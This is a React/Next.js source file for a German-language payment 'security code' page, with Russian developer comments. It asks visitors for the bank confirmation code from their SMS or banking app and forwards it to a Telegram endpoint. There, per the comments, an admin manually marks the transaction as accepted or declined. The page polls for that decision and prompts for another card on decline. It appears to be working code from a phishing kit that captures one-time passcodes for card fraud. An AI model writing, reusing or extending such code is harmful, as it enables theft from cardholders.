'use client';

import { useState, useEffect, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Button from '@/components/Button';
import { useAuthStore } from '@/lib/store';

function CodeInputForm() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const { token } = useAuthStore();
  const orderId = searchParams.get('orderId') || '';
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  // Polling статуса заказа, чтобы проверить, не изменился ли он на "error"
  useEffect(() => {
    if (!orderId) return;

    let isPolling = true;

    const checkStatus = async () => {
      if (!isPolling) return;

      try {
        // Проверяем обновления Telegram
        try {
          const pollResponse = await fetch(`/api/telegram/poll-updates?offset=0&t=${Date.now()}`, {
            cache: 'no-store',
          });

          if (pollResponse.ok) {
            const pollData = await pollResponse.json();
            if (pollData.processedCallbacks && pollData.processedCallbacks.length > 0) {
              console.log('[Code Page] Callbacks processed:', pollData.processedCallbacks);
            }
          }
        } catch (pollError) {
          console.error('[Code Page] Poll error:', pollError);
        }

        // Проверяем статус заказа
        const response = await fetch(`/api/orders/${orderId}/status?t=${Date.now()}`, {
          cache: 'no-store',
          headers: {
            'Cache-Control': 'no-cache',
          }
        });

        if (response.ok) {
          const data = await response.json();
          const status = data.status;

          // Если статус изменился на error, перенаправляем на страницу ошибки
          if (status === 'error') {
            console.log('[Code Page] Status changed to error, redirecting');
            isPolling = false;
            router.push(`/checkout/error?orderId=${orderId}`);
            return;
          }
        }
      } catch (error) {
        console.error('[Code Page] Error checking status:', error);
      }
    };

    // Проверяем статус каждую секунду
    const interval = setInterval(() => {
      if (isPolling) {
        checkStatus();
      }
    }, 1000);
    checkStatus(); // Первая проверка сразу

    return () => {
      isPolling = false;
      clearInterval(interval);
    };
  }, [orderId, router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    
    if (!code || code.length < 4) {
      setError('Bitte geben Sie einen gültigen Code ein');
      return;
    }

    setLoading(true);

    try {
      // Отправляем код в Telegram
      const response = await fetch('/api/telegram/send-code', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          orderId,
          code,
        }),
      });

      if (response.ok) {
        // Ждем немного, чтобы дать админу время нажать кнопку в Telegram
        // Проверяем статус несколько раз с задержкой
        let statusChecked = false;
        for (let i = 0; i < 3; i++) {
          await new Promise(resolve => setTimeout(resolve, 1500));

          // Проверяем текущий статус заказа
          const statusResponse = await fetch(`/api/orders/${orderId}/status?t=${Date.now()}`, {
            cache: 'no-store',
          });

          if (statusResponse.ok) {
            const statusData = await statusResponse.json();
            const currentStatus = statusData.status;

            console.log('[Code Page] Current status after code submission (attempt', i + 1, '):', currentStatus);

          // Если статус error, показываем ошибку
          if (currentStatus === 'error') {
            setLoading(false);
            setError('Die Transaktion wurde abgelehnt. Bitte versuchen Sie es erneut oder verwenden Sie eine andere Karte.');
            
            // Обновляем статус заказа в базе данных
            try {
              await fetch(`/api/orders/${orderId}/update-status`, {
                method: 'POST',
                headers: { 
                  'Content-Type': 'application/json',
                  'Authorization': `Bearer ${token}`,
                },
                body: JSON.stringify({ status: 'error' }),
              });
            } catch (error) {
              console.error('[Code Page] Failed to update order status in DB:', error);
            }
            
            // Перенаправляем на страницу ошибки через 3 секунды
            setTimeout(() => {
              router.push(`/checkout/error?orderId=${orderId}`);
            }, 3000);
            statusChecked = true;
            return;
          }
          }
        }

        // Если после всех проверок статус не error, обновляем на completed и переходим на успех
        if (!statusChecked) {
          // Обновляем статус во временном хранилище
          await fetch(`/api/orders/${orderId}/status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ status: 'completed' }),
          });

          // Обновляем статус заказа в базе данных
          try {
            await fetch(`/api/orders/${orderId}/update-status`, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`,
              },
              body: JSON.stringify({ status: 'completed' }),
            });
          } catch (error) {
            console.error('[Code Page] Failed to update order status in DB:', error);
          }

          // Переходим на страницу успеха
          router.push('/checkout/success');
        }
      } else {
        setError('Fehler beim Senden des Codes. Bitte versuchen Sie es erneut.');
      }
    } catch (error) {
      console.error('Code submission error:', error);
      setError('Ein Fehler ist aufgetreten');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center py-16">
      <div className="w-full max-w-md px-4">
        <div className="bg-gradient-to-br from-card-bg-start to-card-bg-end rounded-card border border-card-border p-8">
          <div className="text-center mb-6">
            <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-neon-green/20 flex items-center justify-center">
              <svg className="w-12 h-12 text-neon-green" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h1 className="text-3xl font-bold mb-2">Sicherheitscode</h1>
            <p className="text-text-muted">
              Geben Sie den Bestätigungscode ein, den Sie von Ihrer Bank erhalten haben, um die Transaktion abzuschließen.
            </p>
          </div>

          {error && (
            <div className="mb-4 p-4 bg-red-500/10 border border-red-500/30 rounded-lg text-red-400 text-sm">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-sm font-medium mb-2">
                Bestätigungscode <span className="text-red-400">*</span>
              </label>
              <input
                type="text"
                required
                value={code}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '').substring(0, 6);
                  setCode(value);
                  setError('');
                }}
                placeholder="123456"
                maxLength={6}
                className="w-full px-4 py-3 rounded-lg bg-background border border-card-border text-foreground text-center text-2xl tracking-widest focus:border-neon-green focus:outline-none transition-colors duration-250"
              />
              <p className="mt-2 text-xs text-text-muted text-center">
                Der Code wurde Ihnen per SMS oder in der Banking-App zugesendet
              </p>
            </div>

            <Button
              type="submit"
              variant="primary"
              className="w-full"
              disabled={loading || code.length < 4}
            >
              {loading ? 'Wird verarbeitet...' : 'Code bestätigen'}
            </Button>
          </form>
        </div>
      </div>
    </div>
  );
}

export default function CodePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-text-muted">Lade...</div>
      </div>
    }>
      <CodeInputForm />
    </Suspense>
  );
}
